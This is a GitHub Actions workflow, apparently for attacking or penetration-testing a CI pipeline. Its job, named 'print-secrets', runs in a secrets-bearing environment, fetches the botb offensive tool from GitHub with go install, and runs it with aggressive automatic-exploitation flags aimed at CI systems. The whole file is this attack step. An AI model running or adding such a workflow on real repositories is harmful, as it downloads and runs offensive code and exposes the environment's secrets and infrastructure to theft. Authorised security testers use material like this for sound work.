name: botb

on:
  push:
    branches:
      - main

jobs:
  print-secrets:
    runs-on: ubuntu-latest
    environment: cs
    steps:
      - uses: actions/checkout@v3
      - name: botb
        run: |
          go install github.com/brompwnie/botb
          botb -aggr -autopwn -cicd
